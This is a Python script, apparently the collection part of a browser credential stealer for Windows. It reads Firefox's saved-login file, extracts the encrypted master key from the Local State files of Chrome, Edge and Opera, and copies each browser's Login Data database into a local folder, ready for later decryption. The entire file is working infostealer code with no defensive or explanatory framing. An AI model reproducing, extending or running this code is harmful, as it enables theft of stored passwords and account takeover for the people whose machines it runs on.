from os import listdir, getenv, getcwd, mkdir
from shutil import rmtree, copyfile
from json import load, dumps

def takeFirefoxData():
	app_data = getenv('APPDATA', 'C:\\Users\\User\\AppData\\Roaming')
	mozilla_profiles_path = app_data + '\\Mozilla\\Firefox\\Profiles'
	login_data_file = 'logins.json'
	
	sd_file_path = getcwd() + '\\data\\data.txt'
		
	try:
		for profile in listdir(f'{mozilla_profiles_path}'):
			with open(f'{mozilla_profiles_path}\\{profile}\\{login_data_file}', "r") as logins_file:
				with open(f'{sd_file_path}', "a+") as output_file:
					data = load(logins_file)
					output_file.write('Firefox:\n')
					output_file.write('============================\n')
					output_file.write('{ \"logins\":[\n')
					for login in data['logins']:
						new_data = {'hostname': login['hostname'],
							'encryptedPassword': login['encryptedPassword'],
							'encryptedUsername': login['encryptedUsername']
						}
						new_data = dumps(new_data)
						output_file.write(new_data + ',\n')
					output_file.write('{}]}\n')
					output_file.write('============================\n')
	except FileNotFoundError:
		print(f'File not found {mozilla_profiles_path}')


def takeChromeData():
	app_data = getenv('LocalAppData', 'C:\\Users\\User\\AppData\\Local')
	chrome_key_path = app_data + '\\Google\\Chrome\\User Data'
	key_data_file = 'Local State'
	login_data_path = 'Default\\Login Data'
	sd_file_path = getcwd() + '\\data\\data.txt'
	try:
		with open(f'{chrome_key_path}\\{key_data_file}', "r") as logins_file:
			with open(f'{sd_file_path}', "a+") as output_file:
				data = load(logins_file)
				new_data = { "encrypted_key": data['os_crypt']['encrypted_key']}
				new_data = dumps(new_data)
				output_file.write('Chrome:\n')
				output_file.write('============================\n')
				output_file.write(new_data)
				output_file.write('\n============================\n')
		
	except FileNotFoundError:
		print(f'File not found {chrome_key_path}\\{key_data_file}')

	try:
		copyfile(f'{chrome_key_path}\\{login_data_path}', getcwd() + '\\data\\chrome_logins.sql')
	except FileNotFoundError:
		print(f'File not found {chrome_key_path}\\{login_data_path}')


def takeEdgeData():
	app_data = getenv('LocalAppData', 'C:\\Users\\User\\AppData\\Local')
	edge_key_path = app_data + '\\Microsoft\\Edge\\User Data'
	key_data_file = 'Local State'
	login_data_path = 'Default\\Login Data'
	sd_file_path = getcwd() + '\\data\\data.txt'
	try:
		with open(f'{edge_key_path}\\{key_data_file}', "r") as logins_file:
			with open(f'{sd_file_path}', "a+") as output_file:
				data = load(logins_file)
				new_data = { "encrypted_key": data['os_crypt']['encrypted_key']}
				new_data = dumps(new_data)
				output_file.write('Edge:\n')
				output_file.write('============================\n')
				output_file.write(new_data)
				output_file.write('\n============================\n')
		
	except FileNotFoundError:
		print(f'File not found {edge_key_path}\\{key_data_file}')

	try:
		copyfile(f'{edge_key_path}\\{login_data_path}', getcwd() + '\\data\\edge_logins.sql')
	except FileNotFoundError:
		print(f'File not found {edge_key_path}\\{login_data_path}')


def takeOperaData():
	app_data = getenv('LocalAppData', 'C:\\Users\\User\\AppData\\Local')
	opera_key_path = app_data + '\\Opera Software\\Opera Stable\\User Data'
	key_data_file = 'Local State'
	login_data_path = 'Default\\Login Data'
	sd_file_path = getcwd() + '\\data\\data.txt'
	try:
		with open(f'{opera_key_path}\\{key_data_file}', "r") as logins_file:
			with open(f'{sd_file_path}', "a+") as output_file:
				data = load(logins_file)
				new_data = { "encrypted_key": data['os_crypt']['encrypted_key']}
				new_data = dumps(new_data)
				output_file.write('Opera:\n')
				output_file.write('============================\n')
				output_file.write(new_data)
				output_file.write('\n============================\n')
		
	except FileNotFoundError:
		print(f'File not found {opera_key_path}\\{key_data_file}')

	try:
		copyfile(f'{opera_key_path}\\{login_data_path}', getcwd() + '\\data\\opera_logins.sql')
	except FileNotFoundError:
		print(f'File not found {opera_key_path}\\{login_data_path}')


def takeAllData():
	takeFirefoxData()
	takeChromeData()
	takeEdgeData()
	takeOperaData()

if __name__ == '__main__':
	if 'data' in listdir(getcwd()):
		rmtree('data')
	mkdir('data')
	takeAllData()
